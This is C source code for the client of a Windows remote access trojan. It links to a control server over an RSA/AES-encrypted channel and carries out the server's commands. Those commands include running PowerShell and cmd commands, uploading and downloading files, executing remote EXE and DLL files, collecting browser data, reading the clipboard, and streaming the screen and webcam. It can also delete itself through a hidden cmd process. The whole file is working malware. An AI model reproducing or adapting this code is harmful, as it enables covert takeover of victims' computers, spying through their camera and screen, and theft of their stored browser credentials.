#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include "utils.h"
#include "cJSON.h"
#include "sysinfo.h"
#include "shell.h"
#include "tasks.h"
#include "clipboard.h"
#include "filebrowser.h"
#include "rfe.h"
#include "screen.h"
#include "camera.h"
#include "browser.h"

#pragma comment(lib, "ws2_32.lib")

int g_reconnect_delay = 5000;

SessionKey g_session;
SOCKET g_sock = INVALID_SOCKET;
HANDLE g_send_mutex = NULL;
HANDLE g_screen_stop = NULL;
HANDLE g_camera_stop = NULL;

typedef struct {
    char cmd[1024];
} CommandArgs;

void handle_command(void* arg) {
    CommandArgs* ca = (CommandArgs*)arg;
    char* cmd = ca->cmd;

    if (strcmp(cmd, "ping") == 0) {
        sock_send_ex(g_sock, g_send_mutex, "pong", "");
    } else if (strncmp(cmd, "[msg] ", 6) == 0) {
        MessageBoxA(NULL, cmd + 6, "Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
        sock_send(g_sock, g_send_mutex, "ok");
    } else if (strncmp(cmd, "[exec_ps]", 9) == 0) {
        char* out = run_powershell(cmd + 9);
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "[ps_output]%s", line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strncmp(cmd, "[exec_cmd]", 10) == 0) {
        char* out = run_cmd(cmd + 10);
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "[cmd_output]%s", line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strcmp(cmd, "[screen_stop]") == 0) {
        if (g_screen_stop) SetEvent(g_screen_stop);
    } else if (strcmp(cmd, "[cam_stop]") == 0) {
        if (g_camera_stop) SetEvent(g_camera_stop);
    } else if (strcmp(cmd, "[tasklist]") == 0) {
        handle_tasklist(g_sock, g_send_mutex);
    } else if (strncmp(cmd, "[taskkill]", 10) == 0) {
        handle_taskkill(g_sock, g_send_mutex, cmd + 10);
    } else if (strncmp(cmd, "[ls]", 4) == 0) {
        handle_ls(g_sock, g_send_mutex, cmd + 4);
    } else if (strncmp(cmd, "[download]", 10) == 0) {
        handle_download(g_sock, g_send_mutex, cmd + 10);
    } else if (strncmp(cmd, "[delete]", 8) == 0) {
        handle_delete(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[mkdir]", 7) == 0) {
        handle_mkdir(g_sock, g_send_mutex, cmd + 7);
    } else if (strncmp(cmd, "[upload]", 8) == 0) {
        handle_upload(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[rename]", 8) == 0) {
        handle_rename(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[rfe_exe]", 9) == 0) {
        handle_rfe_exe(g_sock, g_send_mutex, cmd + 9);
    } else if (strncmp(cmd, "[rfe_dll]", 9) == 0) {
        handle_rfe_dll(g_sock, g_send_mutex, cmd + 9);
    } else if (strncmp(cmd, "[browser_collect]", 17) == 0) {
        collect_browser_data(cmd + 17, g_sock, g_send_mutex);
    } else if (strcmp(cmd, "[clipboard_get]") == 0) {
        handle_clipboard_get(g_sock, g_send_mutex);
    } else if (strncmp(cmd, "[clipboard_set]", 15) == 0) {
        handle_clipboard_set(g_sock, g_send_mutex, cmd + 15);
    } else if (strcmp(cmd, "[uninstall]") == 0) {
        /* Kendi kendini sil ve kapat */
        char self_path[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, self_path, MAX_PATH);
        char cmd_line[MAX_PATH + 64];
        _snprintf(cmd_line, sizeof(cmd_line),
            "cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"", self_path);
        STARTUPINFOA si = {0}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        closesocket(g_sock);
        ExitProcess(0);
    } else if (strcmp(cmd, "[close]") == 0) {
        closesocket(g_sock);
        ExitProcess(0);
    } else if (strcmp(cmd, "[reconnect]") == 0) {
        closesocket(g_sock);
        /* g_sock = INVALID_SOCKET causes main recv loop to exit, triggering reconnect */
        g_sock = INVALID_SOCKET;
    } else if (strncmp(cmd, "[set_delay]", 11) == 0) {
        int delay = atoi(cmd + 11);
        if (delay > 0) g_reconnect_delay = delay;
    }

    free(ca);
}

// Updated thread helpers
typedef struct {
    int fps;
} StreamArgs;

void screen_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    screen_stream_loop(g_sock, g_send_mutex, g_screen_stop, sa->fps);
    free(sa);
}

void camera_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    camera_stream_loop(g_sock, g_send_mutex, g_camera_stop, sa->fps);
    free(sa);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    load_config_from_resource();
    if (g_port == 0) {
        // Fallback or exit if no config
        // For now, let's keep some defaults or just wait for config
    }

    g_send_mutex = CreateMutex(NULL, FALSE, NULL);

    char* info = collect_sysinfo();

    while (1) {
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = (g_host[0] != 0) ? inet_addr(g_host) : INADDR_NONE;
        server.sin_port = htons(g_port);

        if (server.sin_addr.s_addr == INADDR_NONE || g_port == 0) {
            closesocket(g_sock);
            Sleep(g_reconnect_delay);
            continue;
        }

        if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            closesocket(g_sock);
            Sleep(g_reconnect_delay);
            continue;
        }

        // 1. Handshake: Generate AES key/IV and send encrypted with RSA
        HCRYPTPROV hProv;
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
        CryptGenRandom(hProv, 32, g_session.key);
        CryptGenRandom(hProv, 16, g_session.iv);
        CryptReleaseContext(hProv, 0);

        unsigned char session_data[48];
        memcpy(session_data, g_session.key, 32);
        memcpy(session_data + 32, g_session.iv, 16);

        char* encrypted_hs = rsa_encrypt_pkcs1(session_data, 48, RSA_PUB_KEY);
        if (encrypted_hs) {
            cJSON* hs_root = cJSON_CreateObject();
            cJSON_AddStringToObject(hs_root, "session", encrypted_hs);
            char* hs_json = cJSON_PrintUnformatted(hs_root);
            char hs_buf[2048];
            _snprintf(hs_buf, sizeof(hs_buf), "%s\n", hs_json);
            send(g_sock, hs_buf, (int)strlen(hs_buf), 0);
            free(hs_json);
            cJSON_Delete(hs_root);
            free(encrypted_hs);
        }

        char sysinfo_msg[4096];
        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "[sysinfo]%s", info);
        sock_send(g_sock, g_send_mutex, sysinfo_msg);

        char buf[8192];
        int n;
        while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = 0;
            char* saveptr;
            char* line = strtok_r(buf, "\n", &saveptr);
            while (line) {
                cJSON* packet = cJSON_Parse(line);
                if (packet) {
                    cJSON* data = cJSON_GetObjectItem(packet, "data");
                    cJSON* iv_b64 = cJSON_GetObjectItem(packet, "iv");
                    if (data && iv_b64) {
                        size_t iv_len;
                        unsigned char* iv = base64_decode(iv_b64->valuestring, strlen(iv_b64->valuestring), &iv_len);
                        size_t plain_len;
                        unsigned char* decrypted = aes_256_cbc_decrypt(data->valuestring, &plain_len, g_session.key, iv);
                        if (decrypted) {
                            decrypted[plain_len] = 0;
                            cJSON* msg = cJSON_Parse((char*)decrypted);
                            if (msg) {
                                cJSON* type = cJSON_GetObjectItem(msg, "type");
                                cJSON* payload = cJSON_GetObjectItem(msg, "payload");
                                if (type && strcmp(type->valuestring, "ping") == 0) {
                                    sock_send_ex(g_sock, g_send_mutex, "pong", "");
                                } else if (type && strcmp(type->valuestring, "command") == 0 && payload) {
                                    char* cmd_val = payload->valuestring;

                                    if (strncmp(cmd_val, "[screen_start]", 14) == 0) {
                                        int fps = atoi(cmd_val + 14);
                                        if (g_screen_stop) {
                                            SetEvent(g_screen_stop);
                                            Sleep(100);
                                            CloseHandle(g_screen_stop);
                                        }
                                        g_screen_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
                                        sa->fps = fps;
                                        _beginthread(screen_thread, 0, sa);
                                    } else if (strncmp(cmd_val, "[cam_start]", 11) == 0) {
                                        int fps = atoi(cmd_val + 11);
                                        if (g_camera_stop) {
                                            SetEvent(g_camera_stop);
                                            Sleep(100);
                                            CloseHandle(g_camera_stop);
                                        }
                                        g_camera_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                                        StreamArgs* sa = malloc(sizeof(StreamArgs));
                                        sa->fps = fps;
                                        _beginthread(camera_thread, 0, sa);
                                    } else {
                                        CommandArgs* ca = malloc(sizeof(CommandArgs));
                                        strncpy(ca->cmd, cmd_val, sizeof(ca->cmd) - 1);
                                        ca->cmd[sizeof(ca->cmd) - 1] = 0;
                                        _beginthread(handle_command, 0, ca);
                                    }
                                }
                                cJSON_Delete(msg);
                            }
                            free(decrypted);
                        }
                        free(iv);
                    }
                    cJSON_Delete(packet);
                }
                line = strtok_r(NULL, "\n", &saveptr);
            }
        }

        closesocket(g_sock);
        if (g_screen_stop) SetEvent(g_screen_stop);
        if (g_camera_stop) SetEvent(g_camera_stop);
        Sleep(g_reconnect_delay);
    }

    free(info);
    return 0;
}
